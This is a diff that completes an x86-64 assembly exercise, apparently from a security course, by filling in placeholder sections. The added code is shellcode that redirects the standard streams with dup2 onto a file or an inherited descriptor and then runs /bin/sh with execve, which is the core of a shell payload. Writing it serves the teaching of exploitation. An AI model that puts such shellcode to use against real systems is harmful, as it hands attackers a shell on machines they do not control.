@@ -1,5 +1,8 @@
 bits 64
 
+out_file db "out.txt", 0
+shell db "/bin/sh", 0
+
 global _start
 
 ; these constants are taken from /usr/include/x86_64-linux-gnu/asm/unistd_64.h
@@ -21,18 +24,37 @@ _start:
 	
 	%define file_descriptor 0x3
 
-	; call open()
-	; your code here
-	
-	
+	mov rax, open_syscall_no              ; Set syscall code
+	lea rdi, [out_file]                   ; Store the address to the filename
+	mov rsi, O_WRONLY | O_CREAT | O_TRUNC ; Set the flags (write, create, truncate)
+	mov rdx, S_IRUSR | S_IWUSR            ; Set the modes (read and write permissions for user)
+	syscall
 %else
 
 	%define file_descriptor 0x4
-	
-	; call dup2() for stdin
-	; your code here
 
+	mov rax, dup2_syscall_no
+	mov rdi, file_descriptor
+	mov rsi, 0x0
+	syscall
 %endif
 
-; call dup2() for stdout and stderr, then call execve()
-; your code here
+
+mov rax, dup2_syscall_no
+mov rdi, file_descriptor
+mov rsi, 0x1
+syscall
+
+
+mov rax, dup2_syscall_no
+mov rdi, file_descriptor
+mov rsi, 0x2
+syscall
+
+
+mov rax, execve_syscall_no
+lea rdi, [shell]
+xor rsi, rsi
+xor rdx, rdx
+syscall
+
